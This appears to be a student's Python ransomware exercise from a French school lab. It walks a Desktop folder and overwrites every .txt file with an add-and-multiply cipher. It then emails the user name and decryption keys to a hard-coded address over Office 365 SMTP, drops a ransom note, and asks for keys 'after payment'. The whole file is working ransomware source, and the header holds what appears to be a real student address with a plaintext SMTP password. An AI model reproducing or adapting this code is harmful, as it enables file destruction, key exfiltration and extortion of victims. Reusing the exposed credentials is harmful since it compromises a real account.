#############################################################################################################################################################
#                                                                   ENVOYER UN MAIL EN PYTHON                                                               #
#                                                                                                                                                           #
#   1 - Renseigner l'adresse mail de l'expéditeur dans les variables SMTP_USERNAME et EMAIL_FROM à l'interieur des guillemets                               #
#   2 - Faites de même dans la variable EMAIL_TO pour l'adresse du receveur. (DANS LE CADRE DE CE TP LES TROIS ADRESSES MAIL A RENTRER SONT IDENTIQUES)     #
#   3 - Renseigner le mot de passe (associé à votre email) dans la variable SMTP_PASSWORD                                                                   #                                                                     #
#                                                                                                                                                           #
#############################################################################################################################################################
                                                                                                                                                            #
SMTP_USERNAME = "n.oberholz@eleve.leschartreux.net"                                                                                                                #
SMTP_PASSWORD = "2EBJQbPxKp"                                                                                                                             #
EMAIL_FROM = "n.oberholz@eleve.leschartreux.net"                                                                                                                   #
EMAIL_TO = "a.claucigh@eleve.leschartreux.net"                                                                                                                     #
#############################################################################################################################################################
from msilib.schema import Directory
from random import *
import smtplib
from pathlib import Path
import time
import os

"""SMTP_USERNAME = "toi@eleve.leschartreux.net"                                                                                                                #
SMTP_PASSWORD = "tonmotdepasse"                                                                                                                             #
EMAIL_FROM = "toi@eleve.leschartreux.net"                                                                                                                   #
EMAIL_TO = "toi@eleve.leschartreux.net" """

#Signature
print("thi3ry")
print("\n")
print("  #####   #######  ##  ##   ##  ##              ####   ##   ##   ####      ####   #######")
print(" ##   ##   ##   #  ##  ##   ##  ##             ##  ##  ##   ##    ##      ##  ##  #   ##")
print(" #         ## #     ####    ##  ##            ##       ##   ##    ##     ##          ##")
print("  #####    ####      ##      ####             ##       ##   ##    ##     ##         ##")
print("      ##   ## #     ####      ##              ##  ###  ##   ##    ##     ##  ###   ##")
print(" ##   ##   ##   #  ##  ##     ##               ##  ##  ##   ##    ##      ##  ##  ##    #")
print("  #####   #######  ##  ##    ####               #####   #####    ####      #####  #######")
print("\n")
print(" ██▀███   ▄▄▄      ▄▄▄██▀▀▀▄▄▄       ██▀███  ▓█████ ")
print("▓██ ▒ ██▒▒████▄      ▒██  ▒████▄    ▓██ ▒ ██▒▓█   ▀ ")
print("▓██ ░▄█ ▒▒██  ▀█▄    ░██  ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   ")
print("▒██▀▀█▄  ░██▄▄▄▄██▓██▄██▓ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄ ")
print("░██▓ ▒██▒ ▓█   ▓██▒▓███▒   ▓█   ▓██▒░██▓ ▒██▒░▒████▒")
print("░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▓▒▒░   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░")
print("  ░▒ ░ ▒░  ▒   ▒▒ ░▒ ░▒░    ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░")
print("  ░░   ░   ░   ▒   ░ ░ ░    ░   ▒     ░░   ░    ░   ")
print("   ░           ░  ░░   ░        ░  ░   ░        ░  ░")
print("\n")
print("   __          __        _          __          __        __  _    ")
print("  / /  ___ _  / /  ___ _(_)__   ___/ /_ __  ___/ /__ ___ / /_(_)__ ")
print(" / /__/ _ `/ / _ \/ _ `/ / -_) / _  / // / / _  / -_|_-</ __/ / _ \ ")
print("/____/\_,_/ /_.__/\_,_/_/\__/  \_,_/\_,_/  \_,_/\__/___/\__/_/_//_/")
print("\n")

who = os.popen("whoami").read()
who = who.encode(encoding='UTF-8')

directory = str((Path(__file__).parent).parent)+"\\Desktop\\dossier_mega_important\\" #Récupère l'emplacement de se script python
#print(directory)

def explore(directory):
    """
    Parcours et liste tous les fichiers / dossiers à partir de l'emplacement donné en paramètre,
    C:/ pour tous le disque C mais attention c'est long... TRES LONG.
    """
    listedos = []
    for f in os.listdir(directory): #parcour tous les fichiers / dossiers juste dans directory
        listedos.append(directory+f+"/")

    #à partir des dossiers d'avant il recommence en avancant d'un cran, et comme la liste grandi il continue
    #jusqu'as qu'il ne puisse plus dans CHAQUE dossier qu'il a trouver 
    for dossier in listedos:
        try:
            for f in os.listdir(dossier):
                listedos.append(dossier+f+"/")
        except:
            pass
    return(listedos)

liste_a_chiffrer = explore(directory)

def Compte_A_Rebour(seconde):
    while seconde:
        m, s = divmod(seconde, 60)
        min_sec_format = '{:02d}:{:02d}'.format(m, s)
        time.sleep(1)
        seconde -= 1

def Chiffrement_ASCII(mot):
    """Chiffrement utilisant le code ASCII. On Additionne puis on multiplie la valeur ASCII."""
    ListeMot = []

    #Création des variables
    Addition = randint(1,100)
    Multiplication = randint(1,100)

    #Création d'une liste contenant les nombres ASCII
    for i in mot:
        ListeMot.append(ord(i))
    for i in range(len(ListeMot)):
        ListeMot[i] = (ListeMot[i] + Addition) * Multiplication

    #Création du mot Chiffrer
    MotChiffrer = ""
    for i in range(len(ListeMot)):
        MotChiffrer = MotChiffrer + str(ListeMot[i]) + "."

    #Création de la clé
    Clé = str(Multiplication) + "." + str(Addition)
    return (MotChiffrer,Clé)

def Déchiffrement_ASCII(Mot_Chiffrer,Clé):
    """Déchiffre une suite chiffrer grâce à la fonction Chiffrement_ASCII.
     La fonction prend en paramètre un mot chiffrer ainsi qu'une clé.
     (Ces deux variables sont obtenus suite à la fonction citer plus haut)"""

    #Utilisation de la clé pour créer les variables Addition et Multiplication
    Addition = ""
    Multiplication = ""
    cpt = True
    for i in Clé:
        if i == ".":
            cpt = False
        elif (cpt):
            Multiplication = Multiplication + i
        else:
            Addition = Addition + i

    #Création d'une liste contenant les mots chiffrer
    ListeLettre = []
    while len(Mot_Chiffrer) != 0 :
        cpt = 0 
        Lettre = ""
        while Mot_Chiffrer[cpt] != ".":
            Lettre = Lettre + Mot_Chiffrer[cpt]
            cpt = cpt + 1
        ListeLettre.append(Lettre)
        Mot_Chiffrer = Mot_Chiffrer[cpt + 1 :]
    

    #Déchiffrement des nombres
    for i in range(len(ListeLettre)):
        ListeLettre[i] = int((int(ListeLettre[i]) / int(Multiplication)) - int(Addition))

    #Conversion des nombres en Lettre et Création du mot Déchiffrer
    Mot_Déchiffrer = ""
    for i in range(len(ListeLettre)):
        ListeLettre[i] = chr(int(ListeLettre[i]))
        Mot_Déchiffrer = Mot_Déchiffrer + str(ListeLettre[i])

    return Mot_Déchiffrer

def action(Bool,acrypter,cle):
    fichier = open(acrypter,"r")
    variable = fichier.read()
    fichier.close()
    if Bool == 1 :
        #Chiffrement du fichier
        mot = Chiffrement_ASCII(variable)
        fichier = open(acrypter,"w")
        fichier.write(mot[0])
        fichier.close()
        print("Chiffrement en cours ...")
        Compte_A_Rebour(2)
        print("Le fichier à été chiffré")
        Compte_A_Rebour(1)
        print("Merci d'avoir chiffré votre fichier avec le logiciel de SexyGuigz")
        #print(mot[1])
        return mot[1]
    else: 
        #Déchiffrement du fichier
        clé = cle
        fichier = open(acrypter,"w")
        fichier.write(Déchiffrement_ASCII(variable,clé))
        fichier.close()
        print("Déchiffrement en cours ...")
        Compte_A_Rebour(2)
        print("Le fichier à bien été Déchiffré")
        Compte_A_Rebour(1)
        print("Merci d'avoir déchiffré votre fichier avec le logiciel de SexyGuigz")

liste_cle = []
for fichier in liste_a_chiffrer:
    if ".txt" in fichier:
        mot = action(1,fichier[:-1],None)
        liste_cle.append(mot)

SMTP_SERVER = "smtp.office365.com"
SMTP_PORT = 587
EMAIL_SUBJECT = "TP Ransomware !"
EMAIL_MESSAGE = who[2:-1]," a ete chiffrer : ",liste_cle


s = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
s.starttls()
s.login(SMTP_USERNAME, SMTP_PASSWORD)
message = 'Subject: {}\n\n{}'.format(EMAIL_SUBJECT, EMAIL_MESSAGE)
s.sendmail(EMAIL_FROM, EMAIL_TO, message)
s.quit()

liste_cle = []

read = open("READ_ME.txt","w")
read.write("Vous avez été infecter è_é\nSi vous voulez essayer de récupérer vos données envoyer un mail à : "+EMAIL_TO+".")
read.close()

for fichier in liste_a_chiffrer:
    if ".txt" in fichier:
        action(2,fichier[:-1],input("Vous avez été infecter è_é\nSi vous voulez essayer de récupérer vos données envoyer un mail à : "+EMAIL_TO+"\nPayer puis renseigner les clés  une à une ci-dessous <3 : \n"))
